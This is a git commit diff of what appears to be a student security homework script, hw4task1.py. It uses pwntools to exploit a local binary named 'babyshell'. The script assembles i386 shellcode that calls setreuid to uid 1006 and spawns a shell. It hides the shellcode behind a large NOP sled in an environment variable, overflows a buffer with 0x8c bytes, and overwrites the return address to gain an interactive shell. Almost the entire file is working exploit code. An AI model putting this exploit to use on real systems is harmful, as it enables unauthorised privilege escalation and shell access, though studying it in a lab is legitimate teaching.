14dd60cd223bf4119af40ff6137820a53a0ee080
NULL280 <henrylong280@gmail.com>
2022-11-02 08:28:24 -0400

    task01

--- lang63_HW4/task01/hw4task1.py
+++ lang63_HW4/task01/hw4task1.py
@@ -1,50 +1,41 @@
 #!/usr/bin/env python3
 from pwn import *
-while 1:
-    # set environment
-    context(arch="i386", os="linux")
 
-    # shell code to set uid
-    payload = asm(shellcraft.setreuid(uid='1006'))
+# set environment
+context(arch="i386", os="linux")
 
-    # shell code main body
-    # build shell code in assembly language
-    assemblyCode = shellcraft.sh()
+# shell code to set uid
+payload = asm(shellcraft.setreuid(uid='1006'))
 
-    # assemble the assembly code
-    byteCode = asm(assemblyCode)
+# shell code main body
+# build shell code in assembly language
+assemblyCode = shellcraft.sh()
 
-    # create process
-    #io = process("./babyshell")
-    io = process('./babyshell', env={'payload': b'\x90'* 100000 + payload + byteCode})
+# assemble the assembly code
+byteCode = asm(assemblyCode)
 
-    # receive
-    print(io.recvline())
+# create process
+#io = process("./babyshell")
+io = process('./babyshell', env={'payload': b'\x90'* 100000 + payload + byteCode})
+
+# receive
+print(io.recvline())
 
 
 
-    # build address
-    # eax = 0x8048590
-    # address = b'\x90\x85\x04\x08'
-    # environment address: 0xffffd343
-    address = int(0xffffd343)
+# build address
+# environment address: 0xffffd343
+address = int(0xffbb0000)
 
-    # build input string
-    # input_bytes = b'\x68' * 0x8c + address + b'\x90' * 1000 + payload + byteCode
-    input_bytes = b'\x68' * 0x8c + p32(address)
+# build input string
+# input_bytes = b'\x68' * 0x8c + address + b'\x90' * 1000 + payload + byteCode
+input_bytes = b'\x68' * 0x8c + p32(address)
 
-    # send input bytes
-    io.sendline(input_bytes)
+# send input bytes
+io.sendline(input_bytes)
 
-    #io.sendline()
-    try:
-        io.sendline()
-        output = io.recvline()
-    except:
-        print("killed")
-        io.kill()
-    else:
-        break
+        
 
 # interact with bash
-#io.interactive()
+io.interactive()
+
